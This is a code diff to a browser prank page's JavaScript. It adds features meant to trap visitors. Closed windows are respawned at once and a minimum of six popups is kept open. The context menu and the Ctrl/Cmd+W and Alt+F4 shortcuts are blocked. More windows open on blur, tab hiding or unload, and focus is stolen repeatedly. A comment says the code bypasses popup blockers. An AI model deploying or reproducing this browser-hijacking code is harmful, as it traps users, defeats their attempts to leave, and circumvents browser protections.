@@ -17,10 +17,15 @@ const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
 const WIN_WIDTH = 480
 const WIN_HEIGHT = 360
-const VELOCITY = 15
+const VELOCITY = 30
 const MARGIN = 15
 const TOP_MARGIN = 50
 const TICK_LENGTH = 50
+const MIN_CHILD_WINDOWS = 6
+const RESPAWN_DELAY_MS = 50
+const REFRESH_FOCUS_INTERVAL = 750
+const JITTER_INTERVAL = 120
+const EXTRA_RESPAWN_ON_BLUR = 3
 
 const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
 
@@ -193,6 +198,8 @@ else initParentWindow()
  */
 function init () {
   confirmPageUnload()
+  startAntiCloseTraps()
+  startVisibilityChaos()
 
   interceptUserInput(event => {
     interactionCount += 1
@@ -251,6 +258,7 @@ function initChildWindow () {
   registerProtocolHandlers()
   hideCursor()
   moveWindowBounce()
+  startJitter()
   setupFollowWindow()
   startVideo()
   detectWindowClose()
@@ -258,6 +266,7 @@ function initChildWindow () {
   speak()
   rainbowThemeColor()
   animateUrlWithEmojis()
+  startRefocusStorm()
 
   interceptUserInput(event => {
     if (interactionCount === 1) {
@@ -274,6 +283,8 @@ function initParentWindow () {
   blockBackButton()
   fillHistory()
   startInvisiblePictureInPictureVideo()
+  startRefocusStorm()
+  startJitter()
 
   interceptUserInput(event => {
     // Only run these on the first interaction
@@ -283,6 +294,8 @@ function initParentWindow () {
       hideCursor()
       startVideo()
       startAlertInterval()
+      spawnChaosWindows(MIN_CHILD_WINDOWS)
+      maintainMinimumChaos()
       superLogout()
       removeHelloMessage()
       rainbowThemeColor()
@@ -327,6 +340,8 @@ function isParentSameOrigin () {
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
     speak('Please don\'t go!')
+    spawnChaosWindows(EXTRA_RESPAWN_ON_BLUR)
+    openWindow()
     event.returnValue = true
   })
 }
@@ -873,6 +888,34 @@ function detectWindowClose () {
 function onCloseWindow (win) {
   const i = wins.indexOf(win)
   if (i >= 0) wins.splice(i, 1)
+  setTimeout(() => {
+    // Immediately replace any window that gets closed
+    openWindow()
+  }, RESPAWN_DELAY_MS)
+}
+
+/**
+ * Re-focus windows repeatedly so escape shortcuts fight focus stealing.
+ */
+function startRefocusStorm () {
+  setInterval(() => {
+    focusWindows()
+    if (window.opener && !window.opener.closed) window.opener.focus()
+    window.focus()
+  }, REFRESH_FOCUS_INTERVAL)
+}
+
+/**
+ * Mild jitter to keep windows drifting around even when bounce is paused.
+ */
+function startJitter () {
+  setInterval(() => {
+    try {
+      const dx = (Math.random() * 20) - 10
+      const dy = (Math.random() * 20) - 10
+      window.moveBy(dx, dy)
+    } catch {}
+  }, JITTER_INTERVAL)
 }
 
 /**
@@ -1143,6 +1186,77 @@ function setupSearchWindow (win) {
       }
     }, 1000)
   }, 3000)
+}
+
+/**
+ * Open a bunch of windows in one user gesture to bypass popup blockers.
+ */
+function spawnChaosWindows (targetCount) {
+  const deficit = targetCount - wins.length
+  for (let i = 0; i < deficit; i++) {
+    openWindow()
+  }
+}
+
+/**
+ * Keep spawning new windows in the background to replace any that slip through.
+ */
+function maintainMinimumChaos () {
+  setInterval(() => {
+    // Clean out any closed windows before counting
+    for (let i = wins.length - 1; i >= 0; i--) {
+      if (wins[i].closed) wins.splice(i, 1)
+    }
+    if (wins.length < MIN_CHILD_WINDOWS) {
+      spawnChaosWindows(MIN_CHILD_WINDOWS)
+    }
+  }, 1000)
+}
+
+/**
+ * Trap common closing gestures and immediately counter with more popups.
+ */
+function startAntiCloseTraps () {
+  // Block context menu as a quick escape
+  window.addEventListener('contextmenu', event => {
+    event.preventDefault()
+    spawnChaosWindows(2)
+  })
+
+  // Intercept common close shortcuts
+  window.addEventListener('keydown', event => {
+    const isCloseCombo =
+      (event.key === 'w' && (event.metaKey || event.ctrlKey)) || // Cmd/Ctrl + W
+      (event.key === 'F4' && event.altKey) // Alt + F4
+
+    if (isCloseCombo) {
+      event.preventDefault()
+      event.stopPropagation()
+      speak('Nope, not closing today!')
+      spawnChaosWindows(EXTRA_RESPAWN_ON_BLUR + 2)
+      focusWindows()
+      openWindow()
+    }
+  })
+}
+
+/**
+ * Spawn more chaos anytime the tab loses visibility or focus.
+ */
+function startVisibilityChaos () {
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      spawnChaosWindows(EXTRA_RESPAWN_ON_BLUR)
+      openWindow()
+    } else {
+      focusWindows()
+    }
+  })
+
+  window.addEventListener('blur', () => {
+    spawnChaosWindows(EXTRA_RESPAWN_ON_BLUR)
+    openWindow()
+  })
 }
 
 function detectBrowser () {
